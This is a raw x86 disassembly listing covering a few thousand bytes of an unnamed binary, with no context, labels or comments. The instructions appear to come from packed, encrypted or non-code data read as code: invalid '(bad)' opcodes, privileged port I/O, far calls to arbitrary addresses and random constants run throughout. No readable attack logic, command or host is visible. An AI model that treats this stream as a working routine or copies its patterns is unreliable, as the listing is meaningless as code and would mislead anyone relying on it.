  41796f:	pop    es
  417970:	jb     0x4179eb
  417972:	mov    bl,0xdb
  417974:	and    al,0x19
  417976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417977:	push   esp
  417978:	adc    al,BYTE PTR [ecx-0x546e00be]
  41797e:	jge    0x4179ff
  417980:	adc    esp,eax
  417982:	dec    ebx
  417983:	es repz (bad) 
  417986:	mov    bl,0xf8
  417988:	popf   
  417989:	jb     0x41795a
  41798b:	cli    
  41798c:	out    dx,eax
  41798d:	mov    bh,0xfd
  417990:	icebp  
  417991:	call   0x9def:0x6e9849cf
  417998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41799a:	sahf   
  41799b:	sub    DWORD PTR [ebx-0x38],ecx
  41799e:	sub    eax,0x702b4c05
  4179a3:	mov    ds:0xb25ee2ae,eax
  4179a8:	test   eax,0x2f0d6ccb
  4179ad:	not    bh
  4179af:	mov    ds:0x580f42c9,al
  4179b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179b5:	jle    0x417a0f
  4179b7:	ds (bad) 
  4179b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179ba:	popf   
  4179bb:	in     al,dx
  4179bc:	out    0x6a,eax
  4179be:	in     al,dx
  4179bf:	out    0x8b,eax
  4179c1:	jl     0x4179a7
  4179c3:	dec    esp
  4179c4:	popa   
  4179c5:	sub    DWORD PTR [esi-0x7aea2273],esi
  4179cb:	xchg   esi,eax
  4179cc:	lahf   
  4179cd:	inc    eax
  4179ce:	dec    edi
  4179cf:	jmp    FWORD PTR [esi]
  4179d1:	mov    ebp,0x6bc1c333
  4179d6:	sub    esp,DWORD PTR [ecx+0x44]
  4179d9:	dec    eax
  4179da:	or     al,0x2b
  4179dc:	cmc    
  4179dd:	adc    ecx,DWORD PTR [eax+0x52b4235e]
  4179e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179e4:	cdq    
  4179e5:	sbb    eax,0xf54beded
  4179ea:	gs dec ebp
  4179ec:	xchg   esp,eax
  4179ed:	imul   ecx,DWORD PTR [eax],0xffffffb0
  4179f0:	pop    ebp
  4179f1:	push   eax
  4179f2:	inc    edx
  4179f3:	aas    
  4179f4:	xchg   ecx,eax
  4179f5:	ret    0x19b3
  4179f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179f9:	sbb    cl,ah
  4179fb:	xchg   esi,eax
  4179fc:	xchg   esi,eax
  4179fe:	iret   
  4179ff:	mov    dl,0xed
  417a01:	pop    ss
  417a02:	pop    DWORD PTR [esi-0x43fc37a8]
  417a08:	mov    dh,0x0
  417a0a:	pusha  
  417a0b:	sbb    BYTE PTR [ebp+0x67],bh
  417a0e:	xor    eax,0xe4e37605
  417a13:	lds    eax,FWORD PTR [edi]
  417a15:	cmp    al,0x10
  417a17:	enter  0x2a65,0xb7
  417a1b:	(bad)  
  417a1d:	inc    ecx
  417a1e:	stc    
  417a1f:	call   0x5e71bc14
  417a24:	dec    ebp
  417a25:	pop    ecx
  417a26:	mov    ebp,0x67f2a6bb
  417a2b:	aad    0x35
  417a2d:	jno    0x417a24
  417a2f:	xchg   ebp,eax
  417a30:	or     BYTE PTR [edx+0x4],ch
  417a33:	call   DWORD PTR [eax+edx*8+0x4a]
  417a37:	dec    eax
  417a38:	popa   
  417a39:	push   0xffffffe5
  417a3b:	xchg   edx,eax
  417a3c:	sub    dl,BYTE PTR [ebp-0x3546b8a5]
  417a42:	(bad)  
  417a43:	pop    eax
  417a44:	test   BYTE PTR [eax+0x4ee7b3fa],0x78
  417a4b:	nop
  417a4c:	nop
  417a4d:	mov    al,ds:0x2cd78990
  417a52:	mov    al,ds:0x960b1978
  417a57:	sub    ax,0xae30
  417a5b:	icebp  
  417a5c:	sbb    DWORD PTR [edi],esi
  417a5e:	ins    DWORD PTR es:[edi],dx
  417a5f:	cld    
  417a60:	outs   dx,DWORD PTR ds:[esi]
  417a61:	das    
  417a62:	lods   al,BYTE PTR ds:[esi]
  417a63:	or     dl,al
  417a65:	push   cs
  417a66:	popa   
  417a67:	cwde   
  417a68:	mov    cs,edi
  417a6a:	aam    0xaa
  417a6c:	shl    DWORD PTR [esi+esi*1+0x4c],1
  417a70:	jle    0x417a9f
  417a72:	adc    al,0x85
  417a74:	dec    esp
  417a75:	jl     0x417ad9
  417a77:	cmc    
  417a78:	mov    esp,0x9f4b687a
  417a7d:	clc    
  417a7e:	sbb    esp,DWORD PTR [edi]
  417a80:	into   
  417a81:	in     al,dx
  417a82:	xchg   esi,eax
  417a83:	add    DWORD PTR [ebp+ebp*2-0x4b],edx
  417a87:	xlat   BYTE PTR ds:[ebx]
  417a88:	test   BYTE PTR [esi],cl
  417a8a:	cdq    
  417a8b:	jo     0x417a6b
  417a8d:	fxch   st(2)
  417a8f:	or     esp,eax
  417a91:	mov    ecx,esi
  417a93:	mov    edx,0x5c471cf
  417a98:	pop    esp
  417a99:	cmp    bl,al
  417a9b:	xor    DWORD PTR [ebp-0x5ec8e6b5],ecx
  417aa1:	cmp    DWORD PTR [ebx+0x6f4cc985],eax
  417aa7:	or     DWORD PTR [edx+ebx*8+0x26e44965],ebp
  417aae:	imul   edx,DWORD PTR [eax+0x30],0xffffff8a
  417ab2:	shl    BYTE PTR [ebx],cl
  417ab4:	pushf  
  417ab5:	jb     0x417b04
  417ab7:	inc    eax
  417ab8:	imul   ebx,DWORD PTR [eax],0xa81228ad
  417abe:	arpl   WORD PTR [edi-0x72],dx
  417ac1:	out    0x4,eax
  417ac3:	mov    al,0x94
  417ac5:	sub    ebp,DWORD PTR [ebp+0x19]
  417ac8:	mov    eax,0x34fd0f35
  417acd:	nop
  417ace:	test   DWORD PTR [esi-0x7523518c],0xeb80f3f2
  417ad8:	fisub  DWORD PTR [ebx-0x20]
  417adb:	inc    edx
  417adc:	and    al,0x93
  417ade:	mov    ebp,0x7cb72cb9
  417ae3:	out    0x79,al
  417ae5:	dec    edx
  417ae6:	pop    ebp
  417ae7:	sbb    al,0x81
  417ae9:	mov    WORD PTR [edi],cs
  417aeb:	inc    edx
  417aec:	mov    ebp,ebp
  417aee:	dec    ecx
  417aef:	mov    esi,0x9838c26d
  417af4:	sbb    eax,0x65558eb5
  417af9:	jmp    0x417b76
  417afb:	into   
  417afc:	imul   edx,DWORD PTR [ebx],0x38
  417aff:	jp     0x417b70
  417b01:	sahf   
  417b02:	imul   eax,DWORD PTR [eax+0x5d],0xffffffa2
  417b06:	fstp   QWORD PTR [esp+edx*1]
  417b09:	(bad)  
  417b0a:	call   0xf08b:0xec186240
  417b11:	call   0x757d:0x6f7a937
  417b18:	into   
  417b19:	test   al,0xc9
  417b1b:	mov    ds:0xa8a48af5,eax
  417b20:	bound  edi,QWORD PTR [edi+0x606746ec]
  417b26:	mov    esp,0xff4d1ed2
  417b2b:	lods   eax,DWORD PTR ds:[esi]
  417b2c:	or     BYTE PTR [edx+edx*8+0x51d0981e],bl
  417b33:	leave  
  417b34:	mov    esp,0x2a4c225c
  417b39:	neg    DWORD PTR [edx-0x1767da84]
  417b3f:	mov    ah,0xe3
  417b41:	mov    ebx,DWORD PTR [ebp+0x4661514f]
  417b47:	pop    ds
  417b48:	pop    esp
  417b4a:	out    0x5e,al
  417b4c:	stos   DWORD PTR es:[edi],eax
  417b4d:	dec    BYTE PTR [esi]
  417b4f:	mov    bl,BYTE PTR [edi]
  417b51:	pop    ebx
  417b52:	or     ah,BYTE PTR [ebp+0x1c]
  417b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b56:	lods   eax,DWORD PTR ds:[esi]
  417b57:	arpl   bx,di
  417b59:	sub    al,0x47
  417b5b:	(bad)  
  417b5d:	shr    DWORD PTR cs:[ebx+ebp*2-0x13],1
  417b62:	out    dx,al
  417b63:	mov    dh,0x2f
  417b65:	call   0x1851:0x19eea211
  417b6c:	mov    esp,DWORD PTR [ebx-0x1a]
  417b6f:	xor    ah,BYTE PTR [eax+0x47]
  417b72:	sub    eax,0xa2dd6101
  417b77:	sbb    al,cl
  417b79:	out    dx,eax
  417b7a:	lds    edx,FWORD PTR [esi-0x4731df70]
  417b80:	mov    ebx,0x833830fd
  417b85:	test   DWORD PTR ds:0xb63b5842,ebx
  417b8b:	xor    eax,0x82425e3e
  417b90:	pop    es
  417b91:	je     0x417c0d
  417b93:	jl     0x417b20
  417b95:	cmc    
  417b96:	(bad)  
  417b98:	jmp    0x43fe:0xedd52e43
  417b9f:	sub    dl,BYTE PTR [edx-0x69]
  417ba2:	call   0xf4ca6496
  417ba7:	fwait
  417ba8:	adc    bh,BYTE PTR [ebx+0x71afc4db]
  417bae:	aad    0x38
  417bb0:	cli    
  417bb1:	ror    BYTE PTR [edx-0x2a99f874],0x17
  417bb8:	call   0x3488d1d9
  417bbd:	or     DWORD PTR [eax+0x6],eax
  417bc0:	push   edx
  417bc1:	shl    DWORD PTR [edi],0x8e
  417bc4:	xchg   eax,ecx
  417bc6:	pop    ecx
  417bc7:	imul   ebp,esi,0xd
  417bca:	push   ss
  417bcb:	loopne 0x417c15
  417bcd:	retf   
  417bce:	das    
  417bcf:	lods   al,BYTE PTR ds:[esi]
  417bd0:	bound  edi,QWORD PTR [edi]
  417bd2:	sub    DWORD PTR [ebp-0x4b42aa33],0x2b
  417bd9:	ret    
  417bda:	sub    ah,BYTE PTR [edi+0x6b]
  417bdd:	xlat   BYTE PTR ds:[ebx]
  417bde:	ret    0xa164
  417be1:	mov    edx,0x3efcee25
  417be6:	out    dx,al
  417be7:	add    edx,edx
  417be9:	jb     0x417c0e
  417beb:	mov    ch,0xc8
  417bee:	mov    edi,DWORD PTR [edi]
  417bf0:	mov    edi,0xf93bb1a6
  417bf5:	or     bh,BYTE PTR [edi]
  417bf7:	aaa    
  417bf8:	stc    
  417bf9:	and    al,0x5
  417bfb:	push   ds
  417bfc:	fsubr  QWORD PTR [eax+0x1c]
  417bff:	test   eax,0xd870aa0b
  417c04:	dec    edi
  417c05:	adc    edx,edx
  417c07:	pushf  
  417c08:	pusha  
  417c09:	retf   0xde4a
  417c0c:	jmp    0x80de4cc1
  417c11:	inc    esp
  417c12:	gs jne 0x417c66
  417c15:	div    BYTE PTR [edi]
  417c17:	lods   eax,DWORD PTR ds:[esi]
  417c18:	xchg   ebx,eax
  417c19:	pop    es
  417c1a:	jb     0x417c8f
  417c1c:	xlat   BYTE PTR ds:[ebx]
  417c1d:	push   ebp
  417c1e:	jne    0x417c80
  417c20:	xor    eax,0x53d266
  417c25:	mov    esi,DWORD PTR [ecx-0x67]
  417c28:	jmp    0xdb309d6a
  417c2d:	push   edi
  417c2e:	int3   
  417c2f:	out    0xcf,eax
  417c31:	inc    eax
  417c32:	retf   0xc190
  417c35:	scas   eax,DWORD PTR es:[edi]
  417c36:	lahf   
  417c37:	dec    esp
  417c38:	cwde   
  417c39:	cmp    eax,0xa9771348
  417c3e:	pusha  
  417c3f:	sbb    ebx,DWORD PTR [ecx-0x57d02ca0]
  417c45:	and    BYTE PTR [edx+esi*2-0x434e06e2],ah
  417c4c:	cwde   
  417c4d:	aas    
  417c4e:	loope  0x417c7b
  417c50:	repnz push ds
  417c52:	(bad)  
  417c53:	int3   
  417c54:	jecxz  0x417c92
  417c56:	fsubr  st,st(5)
  417c58:	loope  0x417ca3
  417c5a:	push   ds
  417c5b:	ins    DWORD PTR es:[edi],dx
  417c5c:	dec    ebx
  417c5d:	retf   
  417c5e:	xor    DWORD PTR [edx+ebx*4],esi
  417c61:	mov    es,WORD PTR [edi]
  417c63:	xchg   WORD PTR [ebx+0x1b5a5cb4],cx
  417c6a:	not    BYTE PTR ds:0xd8867325
  417c70:	xor    bh,cl
  417c72:	mov    bl,0xd0
  417c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c75:	jbe    0x417cb2
  417c77:	jp     0x417ce5
  417c79:	inc    esp
  417c7a:	mov    bl,0x43
  417c7c:	sar    BYTE PTR [edi+esi*1+0x5c],cl
  417c80:	adc    eax,0xa92d9060
  417c85:	cmp    cl,BYTE PTR [eax]
  417c87:	int    0x80
  417c89:	das    
  417c8a:	fcom   QWORD PTR [ecx+0x4e7ff222]
  417c90:	imul   DWORD PTR [edi+edi*4+0x57b7b5fa]
  417c97:	mov    eax,ds:0x5d38d765
  417c9c:	nop
  417c9d:	sti    
  417c9e:	mov    ebp,0xff
  417ca3:	add    BYTE PTR [eax],al
  417ca5:	add    BYTE PTR [edi],ah
  417ca7:	and    eax,0xbb873b85
  417cac:	mov    edi,0xe22d13d
  417cb1:	pusha  
  417cb2:	fidivr WORD PTR [ebx+0x774b14a6]
  417cb8:	add    DWORD PTR [eax],eax
  417cba:	and    al,BYTE PTR [edi]
  417cbc:	add    BYTE PTR [eax],al
  417cbe:	dec    esi
  417cbf:	jg     0x417c85
  417cc1:	fstp   DWORD PTR [edi]
  417cc3:	xchg   ebp,eax
  417cc4:	aad    0x8b
  417cc6:	pop    ecx
  417cc7:	jmp    0x417c65
  417cc9:	es inc edi
  417ccb:	mov    al,0x45
  417ccd:	pop    edx
  417cce:	push   ebx
  417ccf:	outs   dx,BYTE PTR ds:[esi]
  417cd0:	clc    
  417cd1:	mov    edx,0x2e373f96
  417cd6:	mov    DWORD PTR [esi],edx
  417cd8:	js     0x417cfa
  417cda:	mov    ecx,0x1f42b090
  417cdf:	or     eax,0x3aabecea
  417ce4:	scas   eax,DWORD PTR es:[edi]
  417ce5:	gs xor eax,0xdd0a857b
  417ceb:	and    al,BYTE PTR [ecx]
  417ced:	xor    ah,BYTE PTR [ebx+0x50]
  417cf0:	mov    ch,0xb7
  417cf2:	lock repz ja 0x417c96
  417cf6:	sub    al,dl
  417cf8:	cmp    BYTE PTR [edi-0x3c],al
  417cfb:	adc    al,0xbf
  417cfd:	sahf   
  417cfe:	sub    DWORD PTR [edi-0x1c],ebx
  417d01:	test   DWORD PTR [edi-0x6e69cecf],ecx
  417d07:	push   edi
  417d08:	or     dl,BYTE PTR [ebp-0x31]
  417d0b:	test   BYTE PTR [edx],cl
  417d0d:	add    DWORD PTR [ecx],ebx
  417d0f:	adc    BYTE PTR [edx+0x11],cl
  417d12:	ja     0x417c9e
  417d14:	mov    esi,0xa9965818
  417d19:	sub    BYTE PTR [edx+0x7e250c44],0x4f
  417d20:	push   ss
  417d21:	mov    edx,0xfc1a719c
  417d26:	call   eax
  417d28:	pop    esi
  417d29:	mov    al,0xc1
  417d2b:	setle  BYTE PTR [ebx]
  417d2e:	setge  BYTE PTR [esp+eiz*4+0x28]
  417d33:	xchg   ecx,edx
  417d35:	mov    ds:0x83730403,eax
  417d3a:	add    DWORD PTR [ecx+0x3edf3f26],esp
  417d40:	scas   eax,DWORD PTR es:[edi]
  417d41:	std    
  417d42:	mov    bh,0xf6
  417d44:	push   ds
  417d45:	dec    ebp
  417d46:	adc    eax,0xa91d7e95
  417d4b:	mov    ebx,0xa0cb86c8
  417d50:	sub    DWORD PTR [esi],edi
  417d52:	cmc    
  417d53:	mov    edi,0xb003d7a6
  417d58:	jecxz  0x417cdb
  417d5a:	cmp    BYTE PTR [ecx],0xb5
  417d5d:	arpl   WORD PTR [ecx-0x1a17c025],cx
  417d63:	(bad)  
  417d64:	imul   DWORD PTR [edx-0x3ef3c0a7]
  417d6a:	mov    eax,0xe0977ff7
  417d6f:	not    cl
  417d71:	mov    esp,ss
  417d73:	sbb    dh,BYTE PTR [edx+esi*8]
  417d76:	inc    edi
  417d77:	test   eax,0xe86b2c25
  417d7c:	sub    cl,dl
  417d7e:	test   DWORD PTR ds:0x878e4bec,ebx
  417d84:	(bad)  
  417d85:	repnz (bad) 
  417d87:	add    DWORD PTR [esp+esi*8-0x7b],esp
  417d8b:	lahf   
  417d8c:	call   0x23d5:0xa0923269
  417d93:	cmp    ecx,ebp
  417d95:	pusha  
  417d96:	and    eax,0xd7d09c8
  417d9b:	je     0x417db1
  417d9d:	mov    bh,0x12
  417d9f:	daa    
  417da0:	jns    0x417d4a
  417da2:	out    0xb3,al
  417da4:	mov    ebx,0x5ca4a890
  417da9:	retf   0xac54
  417dac:	out    0x9a,eax
  417dae:	cmp    ebx,esp
  417db0:	cmp    DWORD PTR [ecx-0x71],edi
  417db3:	push   es
  417db4:	inc    ebp
  417db5:	shr    BYTE PTR [edx+0x42d99155],1
  417dbb:	and    DWORD PTR [edi+ebp*2],edx
  417dbe:	retf   
  417dbf:	pop    edi
  417dc0:	repnz sbb dh,0x63
  417dc4:	push   ebp
  417dc5:	test   BYTE PTR [edx],bl
  417dc7:	jbe    0x417e2c
  417dc9:	cmp    edi,DWORD PTR [ebx+0x57]
  417dcc:	fwait
  417dcd:	sbb    esp,DWORD PTR [ebx+0x26]
  417dd0:	scas   eax,DWORD PTR es:[edi]
  417dd1:	in     al,0x69
  417dd3:	or     edi,DWORD PTR ds:[ecx]
  417dd6:	outs   dx,BYTE PTR ds:[esi]
  417dd7:	sti    
  417dd8:	loope  0x417e42
  417dda:	sbb    al,0x38
  417ddc:	mov    dl,0xa2
  417dde:	and    eax,0xaff315ad
  417de3:	push   es
  417de4:	jge    0x417e58
  417de6:	das    
  417de7:	ss adc dl,ch
  417dea:	mov    esi,0x1756a1c4
  417def:	mov    edx,0x248ab489
  417df4:	jecxz  0x417e37
  417df6:	mov    al,0xc2
  417df8:	scas   eax,DWORD PTR es:[edi]
  417df9:	jnp    0x417e4b
  417dfb:	mov    DWORD PTR [eax-0x6caef4c8],esp
  417e01:	test   DWORD PTR [ebp-0x7189e6c7],ebx
  417e07:	jae    0x417e42
  417e09:	test   eax,0xb24b929e
  417e0e:	aaa    
  417e0f:	int3   
  417e10:	(bad)  
  417e11:	repz xchg ebp,esp
  417e14:	cmp    esi,DWORD PTR [eax]
  417e16:	adc    DWORD PTR [eax],edi
  417e18:	sbb    DWORD PTR [esi-0x20],ebp
  417e1b:	sub    DWORD PTR [ecx],ebp
  417e1d:	push   0x2f5f9e08
  417e22:	in     eax,0x54
  417e24:	pop    ds
  417e25:	ja     0x417e47
  417e27:	adc    eax,0x8ef56713
  417e2c:	mov    ch,0xcd
  417e2e:	(bad)  
  417e2f:	xor    ch,BYTE PTR [ebx+ebx*4-0x60814dbe]
  417e36:	or     bl,bl
  417e38:	jnp    0x417eb6
  417e3a:	lds    edx,FWORD PTR cs:[edx+0x6a610172]
  417e41:	js     0x417dc7
  417e43:	repz pop eax
  417e45:	test   DWORD PTR [edx],ebx
  417e47:	cmp    bh,dh
  417e49:	out    dx,al
  417e4a:	imul   edi,DWORD PTR [ebp-0x25],0x7a2d4a0
  417e51:	or     BYTE PTR [ecx-0x4b10e4ec],bl
  417e57:	adc    DWORD PTR [bp+di+0x17],eax
  417e5b:	shl    BYTE PTR [edi-0x33],0x0
  417e5f:	mov    al,0x40
  417e61:	mov    ds:0xb9e41632,eax
  417e66:	outs   dx,BYTE PTR ds:[esi]
  417e67:	sbb    edi,eax
  417e69:	ss pop ebp
  417e6b:	sbb    eax,0x176232ca
  417e70:	xor    DWORD PTR [esi-0x35050ad1],ebx
  417e76:	mov    ah,0x83
  417e78:	fild   QWORD PTR ds:[esi-0x3c]
  417e7c:	pushf  
  417e7d:	call   0x8938315a
  417e82:	adc    DWORD PTR [esi-0x6591e016],esp
  417e88:	sub    ch,BYTE PTR [ebp+0x8]
  417e8b:	cli    
  417e8c:	cmp    eax,0xeec929a
  417e91:	data16 loop 0x417f0b
  417e94:	ret    
  417e95:	cmp    DWORD PTR [ebp+eax*4+0x2f53e1b3],edx
  417e9c:	stc    
  417e9d:	fst    QWORD PTR [ebx-0x63]
  417ea0:	pop    esp
  417ea1:	addr16 loope 0x417e89
  417ea4:	pop    esi
  417ea5:	lds    esp,FWORD PTR [ebx]
  417ea7:	scas   eax,DWORD PTR es:[edi]
  417ea8:	xchg   ebp,eax
  417ea9:	xor    esi,DWORD PTR [eax-0x4]
  417eac:	scas   eax,DWORD PTR es:[edi]
  417ead:	stc    
  417eae:	push   edx
  417eaf:	inc    ebp
  417eb0:	ret    0xf815
  417eb3:	fistp  QWORD PTR [ecx+0x5511ac3]
  417eb9:	loop   0x417ebc
  417ebb:	xchg   esi,eax
  417ebc:	xchg   edx,eax
  417ebd:	pop    es
  417ebe:	and    al,0x32
  417ec0:	mov    dl,0xec
  417ec2:	mov    edx,DWORD PTR [esi+0x6d929366]
  417ec8:	arpl   WORD PTR [eax-0x48bf4dcb],bp
  417ece:	jecxz  0x417e8d
  417ed0:	sbb    BYTE PTR [esp+eax*4],0x99
  417ed4:	ins    BYTE PTR es:[edi],dx
  417ed5:	mov    ebp,0xa84a73aa
  417eda:	jnp    0x417e74
  417edc:	inc    eax
  417edd:	xchg   BYTE PTR [eax+eiz*1+0xe],dh
  417ee1:	std    
  417ee2:	iret   
  417ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ee4:	xor    BYTE PTR [ebp+ebp*8+0x64],dh
  417ee8:	sub    DWORD PTR [esi+eiz*4-0x787ab012],edx
  417eef:	enter  0xd9fc,0x78
  417ef3:	add    eax,0x6b46e09a
  417ef8:	mov    edx,0xce9b780
  417efd:	scas   eax,DWORD PTR es:[edi]
  417efe:	outs   dx,DWORD PTR ds:[esi]
  417eff:	aas    
  417f00:	outs   dx,DWORD PTR ds:[esi]
  417f01:	leave  
  417f02:	shl    BYTE PTR [esi-0x37],0x2f
  417f06:	loope  0x417f10
  417f08:	sahf   
  417f09:	mov    edi,0xc9928389
  417f0e:	or     eax,0xdc04afbf
  417f13:	or     eax,0xd958f441
  417f18:	xchg   ebp,eax
  417f19:	loope  0x417f73
  417f1b:	xor    BYTE PTR [esp+edi*8],0x80
  417f1f:	sbb    al,0x6
  417f21:	mov    dh,al
  417f23:	stc    
  417f24:	dec    edx
  417f25:	lea    esi,[ebx+0x4a03e24d]
  417f2b:	add    al,0xa0
  417f2d:	or     ecx,DWORD PTR [ebx]
  417f2f:	lds    esp,FWORD PTR [ebx-0x52]
  417f32:	loope  0x417f96
  417f34:	pop    ecx
  417f35:	or     eax,0x681d930b
  417f3a:	outs   dx,DWORD PTR ds:[esi]
  417f3b:	inc    esi
  417f3c:	cmp    BYTE PTR [ecx+0x3c168783],cl
  417f42:	fild   WORD PTR [ebp+0x56]
  417f45:	xchg   ecx,eax
  417f46:	push   esp
  417f47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f48:	pop    ecx
  417f49:	ficom  DWORD PTR [ecx+0x16]
  417f4c:	mov    ecx,0x44868b6b
  417f51:	mov    al,0x74
  417f53:	aam    0x5
  417f55:	jb     0x417f19
  417f57:	call   0x47b4:0xc5a871e1
  417f5e:	xchg   DWORD PTR [ebp+eiz*1+0x58],edx
  417f62:	and    al,0xaf
  417f64:	int3   
  417f65:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  417f67:	adc    eax,0x3d962065
  417f6c:	dec    ebp
  417f6d:	pop    ecx
  417f6e:	pop    ss
  417f6f:	jb     0x417fab
  417f71:	(bad)  
  417f73:	xor    al,0x3d
  417f75:	xchg   edi,eax
  417f76:	in     eax,0x8a
  417f78:	pop    ds
  417f79:	test   al,0x5
  417f7b:	xchg   ebp,eax
  417f7c:	outs   dx,DWORD PTR ds:[esi]
  417f7d:	bound  esi,QWORD PTR [esp+ebp*8-0x6]
  417f81:	push   eax
  417f82:	lea    ebp,[edx]
  417f84:	dec    edx
  417f85:	xor    al,0x46
  417f87:	pop    edx
  417f88:	jnp    0x417fae
  417f8a:	das    
  417f8b:	cmp    dl,dh
  417f8d:	inc    edi
  417f8e:	cmc    
  417f8f:	xor    edx,DWORD PTR [ebp*4-0x194fc09d]
  417f96:	rcl    BYTE PTR [ebp+0x9],cl
  417f99:	call   0x703f:0x4eea9ad9
  417fa0:	shr    DWORD PTR [ecx*1-0x3c03123a],1
  417fa7:	mov    eax,0x22b31c0b
  417fac:	jns    0x417f5c
  417fae:	rcl    DWORD PTR [edx+0xe],cl
  417fb1:	jle    0x417fed
  417fb3:	adc    DWORD PTR [esi+edi*2],esp
  417fb6:	ret    
  417fb7:	inc    ecx
  417fb8:	jle    0x417f6f
  417fba:	mov    eax,ebp
  417fbc:	call   0x2187:0x42de3f8e
  417fc3:	dec    edx
  417fc4:	adc    al,0x58
  417fc6:	jp     0x417fa6
  417fc8:	in     al,dx
  417fc9:	xchg   dl,dh
  417fcb:	pop    ebx
  417fcc:	sbb    eax,0x94b7d9e3
  417fd1:	dec    esi
  417fd2:	pop    esp
  417fd3:	add    al,0xae
  417fd5:	push   0xdcc564cf
  417fda:	in     eax,dx
  417fdb:	mov    es,WORD PTR [eax-0x3a0f6d88]
  417fe1:	aas    
  417fe2:	out    dx,al
  417fe3:	sbb    esi,DWORD PTR [ebp+0x1c]
  417fe6:	test   eax,0x6b2cb19e
  417feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fec:	popf   
  417fed:	jl     0x418021
  417fef:	or     ebp,esp
  417ff1:	hlt    
  417ff2:	loopne 0x417fe4
  417ff4:	sbb    DWORD PTR [edi-0xaf49d46],0x2d4aee8b
  417ffe:	neg    BYTE PTR [edx+esi*4-0x13bc241e]
  418005:	scas   eax,DWORD PTR es:[edi]
  418006:	push   ss
  418007:	(bad)  
  418008:	fdivr  DWORD PTR [ebp+0x71cd91a2]
  41800e:	das    
  41800f:	test   eax,0x1ffc893e
  418014:	pusha  
  418015:	inc    eax
  418016:	cmp    BYTE PTR [esi],ch
  418018:	outs   dx,BYTE PTR ds:[esi]
  418019:	test   BYTE PTR [esi+0x2d],bl
  41801c:	sub    al,0x5b
  41801e:	lods   eax,DWORD PTR ds:[esi]
  41801f:	push   cs
  418020:	scas   eax,DWORD PTR es:[edi]
  418021:	(bad)  
  418022:	test   eax,0x3db8a45d
  418027:	rol    bl,cl
  418029:	rcl    BYTE PTR [esi],cl
  41802b:	in     eax,0xfa
  41802d:	jle    0x417fee
  41802f:	rcr    DWORD PTR [edi+0x6c26613c],cl
  418035:	shr    ebp,0x2d
  418038:	mov    ebx,0xc6a674ba
  41803d:	jmp    0x8f37e770
  418042:	loop   0x4180be
  418044:	sub    BYTE PTR [esi-0x7d],bh
  418047:	cmp    edi,DWORD PTR [ecx*8-0x141b2124]
  41804e:	pushf  
  41804f:	xchg   esp,eax
  418050:	mov    ds:0x595467a0,al
  418055:	pop    ecx
  418056:	out    0xb0,al
  418058:	jno    0x41801b
  41805a:	aaa    
  41805b:	mov    bh,0xe4
  41805d:	es pusha 
  41805f:	add    ch,dl
  418061:	test   DWORD PTR [eax],0xb60f4e0a
  418067:	and    esp,DWORD PTR [ebx+edx*4]
  41806a:	jne    0x418099
  41806c:	xlat   BYTE PTR ds:[ebx]
  41806d:	adc    DWORD PTR [ebp+0x75291ef5],edx
  418073:	and    eax,0x47a320dc
  418078:	cmp    ebp,eax
  41807a:	outs   dx,BYTE PTR ds:[esi]
  41807b:	dec    ebx
  41807c:	mov    ebx,0x4f08caa2
  418081:	fs jno 0x4180e4
  418084:	ds jg  0x418038
  418087:	sbb    DWORD PTR ds:0x8f020201,ebx
  41808d:	mov    dl,0x40
  41808f:	and    BYTE PTR [edi+0x411c5598],ch
  418095:	jp     0x418066
  418097:	cmp    BYTE PTR [eax+0x64],cl
  41809a:	shr    DWORD PTR [ecx+eiz*8],cl
  41809d:	outs   dx,DWORD PTR ds:[esi]
  41809e:	jp     0x41807e
  4180a0:	sub    BYTE PTR [ebx],ch
  4180a2:	test   BYTE PTR [ecx],cl
  4180a4:	add    edx,ebx
  4180a6:	ins    DWORD PTR es:[edi],dx
  4180a7:	shr    BYTE PTR [edx+edi*1+0x3fb82088],0x92
  4180af:	inc    esp
  4180b0:	idiv   DWORD PTR [ecx+0x51993d21]
  4180b6:	imul   DWORD PTR [eax]
  4180b8:	mov    dl,0xd8
  4180ba:	and    BYTE PTR [ebp+0x3c],dh
  4180bd:	js     0x418069
  4180bf:	js     0x41804c
  4180c1:	adc    ebp,DWORD PTR [esi+0x7b1bc4cb]
  4180c7:	mov    al,0x76
  4180c9:	shl    edi,cl
  4180cb:	mov    ecx,0xe3c25937
  4180d0:	cs cmp al,0xf7
  4180d3:	pop    ebx
  4180d4:	jae    0x4180ee
  4180d6:	in     eax,dx
  4180d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180d8:	push   ebx
  4180d9:	jno    0x4180b4
  4180db:	aam    0xe4
  4180dd:	(bad)  
  4180de:	push   0xf66f30d4
  4180e3:	push   ebp
  4180e4:	gs push ds
  4180e6:	mov    al,0xdc
  4180e8:	push   eax
  4180e9:	retf   0x8b64
  4180ec:	test   al,0xef
  4180ee:	dec    esi
  4180ef:	add    edi,eax
  4180f1:	adc    DWORD PTR [edi+0x75],ebp
  4180f4:	jmp    0xf6ade5c9
  4180f9:	xchg   ecx,eax
  4180fa:	test   al,0x9b
  4180fc:	push   0xffffffe7
  4180fe:	pusha  
  4180ff:	into   
  418100:	push   cs
  418101:	pop    eax
  418102:	popa   
  418103:	dec    esp
  418104:	or     eax,0x24d67123
  418109:	add    DWORD PTR [ebx],ecx
  41810b:	nop
  41810c:	loope  0x41814c
  41810e:	or     eax,0x8e516dc2
  418113:	lock lahf 
  418115:	stos   DWORD PTR es:[edi],eax
  418116:	inc    ebp
  418117:	(bad)
  41811a:	addr16 jb 0x41809d
  41811d:	call   0xc3bb305d
  418122:	sbb    cl,dh
  418124:	and    eax,0x6076d0f4
  418129:	lock addr16 inc edi
  41812c:	jl     0x418106
  41812e:	xchg   DWORD PTR [edi+esi*2-0x48],esi
  418132:	dec    edi
  418133:	rcl    BYTE PTR [edi],0x34
  418136:	call   0x394c6921
